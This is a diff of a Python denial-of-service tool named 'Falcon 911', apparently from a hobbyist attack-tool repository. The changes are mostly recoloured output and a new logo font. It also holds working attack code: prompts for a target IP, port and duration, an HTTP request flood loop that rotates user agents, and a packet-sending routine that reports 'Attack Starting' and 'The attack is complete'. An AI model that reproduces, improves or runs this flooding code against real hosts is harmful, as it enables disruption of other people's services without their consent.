@@ -9,6 +9,7 @@ from queue import Queue
 import urllib.request
 import requests
 from halo import Halo
+from colorama import Fore
 
 # Colors
 Z1 = '\033[95m'  # بنفسجي
@@ -26,7 +27,7 @@ U = '\033[4m' #مسطر
 
 # -- Info -- #
 __author__ = 'Al-Mohammady Team'
-__version__ = '7.5'
+__version__ = '7.5 [ BETA ]'
 __status__ = "being developed ..."
 # —----——----—---——----
 
@@ -56,9 +57,10 @@ def infoTool():
 os.system("clear")
 # Function to print gradient logo
 def print_gradient_logo():
-    logo = pyfiglet.figlet_format('Falcon 911', font='speed')
+    logo = pyfiglet.figlet_format('Falcon 911', font='doh')
     gradient_colors = [
-        '\033[91m',
+        Fore.LIGHTGREEN_EX,
+        Fore.LIGHTYELLOW_EX
 
     ]
     for i, line in enumerate(logo.split('\n')):
@@ -67,18 +69,18 @@ def print_gradient_logo():
 # Print the gradient logo
 print_gradient_logo()
 infoTool()
-print(D+'\n–– FALCON Run ––\n')
+print(Fore.LIGHTBLACK_EX+'\n–– FALCON Run ––\n')
 
-host = input(f"{F}[ ? ] {L}IP Target  : ")
-port = int(input(f"{F}[ ? ] {L}Port       : "))
-attack_time = int(input(f"{F}[ ? ] {L}Time       : "))
-delay_time = int(input(f"{F}[ ? ] {L}Delay time : "))
+host = input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}IP Target  : ")
+port = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Port       : "))
+attack_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Time       : "))
+delay_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Delay time : "))
 
 
 os.system("clear")
 print_gradient_logo()
-print("%sAttack Starting To IP %s%s %susing Port %s%s" % (F, L, host, F, L, port))
-print(f'{F}Attack finished after {L}{attack_time}{L} seconds.\n')
+print("%sAttack Starting To IP %s%s %susing Port %s%s" % (Fore.GREEN, Fore.YELLOW, host, Fore.GREEN, Fore.YELLOW, port))
+print(f'{Fore.GREEN}Attack finished after {Fore.YELLOW}{attack_time}{Fore.GREEN} seconds.\n')
 spinner = Halo(text='Loading', color='red', spinner='hamburger')
 spinner.start()
 time.sleep(3)
@@ -116,22 +118,20 @@ def buildblock(size):
 def httpcall(url):
     global successHttp
     successHttp = 0
-
-    while time.time() < end_time:
-        try:
-            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print(f"\033[94m[ {req.getcode()} ] {L}HTTPCALL !\033[0m")
+    try:
+        while time.time() < end_time:
             successHttp += 1
-            time.sleep(1)
-        except urllib.error.HTTPError as e:
-            print(f'\033[94m[ {e.code} ] {L}Error Httpcall ! \033[0m')
+            
+            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
+            print(f"{Fore.YELLOW}[ {req.getcode()} ] {Fore.WHITE}HTTPCALL !{Fore.RESET}")
+            
             time.sleep(.1)
-        except Exception as e:
-            print(f'\033[94m[ ERROR ] {L}Unexpected error: {e} ... try again ... \033[0m')
-            time.sleep(.1)
-     
-    
-    print(f'{B}[ % ] {L}HTTP Sent : {B}{successHttp}.')
+    except :
+        print(f'{Fore.RED}[ Error ] {Fore.MAGENTA}Error Httpcall !')
+        time.sleep(.1)
+    else:
+        print(f'{Fore.MAGENTA}[ % ] {Fore.WHITE}HTTP Sent : {Fore.MAGENTA}{successHttp}.')
+
 # -- Down It -- #
 
 def down_it(item):
@@ -146,7 +146,7 @@ def down_it(item):
 
             if s.sendto(packet, (host, int(port))):
                 s.close()
-                print(f'{F}[ {sent} ] {L}Sent Request! Size: {F}{len(packet)}')
+                print(f'{Fore.GREEN}[ {sent} ] {Fore.YELLOW}Sent Request! Size: {Fore.GREEN}{len(packet)}.')
             else:
                 s.close()
                 print("\033[91mshut<->down\033[0m")
@@ -156,8 +156,8 @@ def down_it(item):
         print(f"\033[91mSocket error: {e}\033[0m")
         time.sleep(.1)
 
-    print(f"{F}[ ! ]{L} The attack is complete.")
-    print(f"{B}[ % ] {L}Request Sent : {B}{sent}.")
+    print(f"{Fore.MAGENTA}[ ! ]{Fore.RED} The attack is complete.")
+    print(f"{Fore.MAGENTA}[ % ] {Fore.WHITE}Request Sent : {Fore.MAGENTA}{sent}.")
     sys.exit(1)
 
 uagent = user_agent()
